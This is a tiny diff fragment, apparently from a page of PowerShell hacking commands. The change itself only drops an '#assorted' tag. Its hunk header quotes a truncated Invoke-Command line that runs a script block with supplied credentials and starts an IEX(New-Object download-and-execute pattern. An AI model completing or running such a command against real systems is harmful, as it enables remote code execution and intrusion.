@@ -20,4 +20,4 @@ Invoke-Command -Computer 127.0.0.1 -Credential $cred -ScriptBlock { IEX(New-Obje
 
 Tags:
 
-    #assorted #command #hacking #powershell
+    #command #hacking #powershell 
